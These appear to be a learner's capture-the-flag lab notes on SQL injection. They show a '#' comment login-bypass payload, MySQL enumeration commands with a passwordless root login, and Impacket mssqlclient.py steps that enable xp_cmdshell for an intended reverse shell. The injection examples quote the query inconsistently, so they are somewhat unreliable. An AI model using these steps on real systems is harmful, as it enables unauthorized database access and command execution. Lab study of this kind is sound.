- [SQL Injection](#sqli)
- [MYSQL](#mysql)
- [mssqlclient.py](#msspy)

## SQL INJECTION <a name="sqli"></a>

### '#'
The **#** character is used for commenting. So, if the line responsible for the login is: 
````bash
SELECT * FROM users WHERE user=\$user AND password=\$password
```` 
When we login on the page and enter user=Kill-9 and password=123, the executed statement will be: 
````bash
SELECT * FROM users WHERE user='Kill-9' AND password=$123
````
 If we input:
 ````bash
 user=Kill-9'#'
````
The statement will be: 
````bash
SELECT * FROM users WHERE user='Kill-9'# AND password=$123
```` 
The commented part is not processed, granting us access.

## MySQL <a name="mysql"></a>

Commands:

````bash
SHOW databases;
````  
- Prints out the databases we can access.
````bash
USE {database_name};
````  
- Set to use the database named {database_name}.
````bash
SHOW tables;
````  
- Prints out the available tables inside the current database.
````bash
SELECT * FROM {table_name};
````  
- Prints out all the data from the table {table_name}.

To connect:
````bash
mysql -h 10.129.42.201 -u root
````


## mssqlclient.py <a name="msspy"></a>
mssqlclient.py is a script from the Impacket class collection. When mssqlclient.py is executed, a connection is established with the specified SQL Server and it allows interaction through a command-line interface.

- `windows-auth`: This flag is specified to use Windows Authentication.
- `ARCHETYPE/sql_svc`: Server ID (previously found).
````bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
````

In case `xp_cmdshell` is not enabled (which is the command we will use for a reverse shell), perform the following steps:
````bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; -- Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

````